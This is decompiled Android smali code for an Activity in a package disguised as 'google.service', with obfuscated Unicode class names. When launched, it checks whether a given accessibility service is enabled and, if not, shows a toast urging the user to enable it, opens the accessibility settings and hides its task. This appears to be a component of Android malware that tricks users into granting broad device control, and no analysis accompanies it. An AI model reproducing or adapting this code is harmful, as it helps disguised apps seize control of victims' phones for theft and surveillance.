.class public Lgoogle/service/ⶱʾ䉀ʿⶱʿᴵㅤיⶱʾⶱⶱˎ$ʿ$䉀ʾ$$ﹳـ4785;
.super Landroid/app/Activity;
.source "\u2db1\u02be\u4240\u02bf\u2db1\u02bf\u1d35\u3164\u05d9\u2db1\u02be\u2db1\u2db1\u02ce$\u02bf$\u4240\u02be$$\ufe73\u06404785.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 18
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 2

    .line 57
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 58
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 61
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1

    .line 24
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 32
    :try_start_0
    const-class p1, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47722;

    invoke-static {p0, p1}, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->isAccessibilityServiceEnabled(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 33
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "Enable Accessibility For : "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const v0, 0x7f09000a

    invoke-virtual {p0, v0}, Lgoogle/service/ⶱʾ䉀ʿⶱʿᴵㅤיⶱʾⶱⶱˎ$ʿ$䉀ʾ$$ﹳـ4785;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x1

    invoke-static {p0, p1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    .line 34
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-direct {p1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v0, 0x70000000

    .line 35
    invoke-virtual {p1, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 36
    invoke-virtual {p0, p1}, Lgoogle/service/ⶱʾ䉀ʿⶱʿᴵㅤיⶱʾⶱⶱˎ$ʿ$䉀ʾ$$ﹳـ4785;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 44
    :catch_0
    :cond_0
    invoke-virtual {p0}, Lgoogle/service/ⶱʾ䉀ʿⶱʿᴵㅤיⶱʾⶱⶱˎ$ʿ$䉀ʾ$$ﹳـ4785;->finish()V

    return-void
.end method
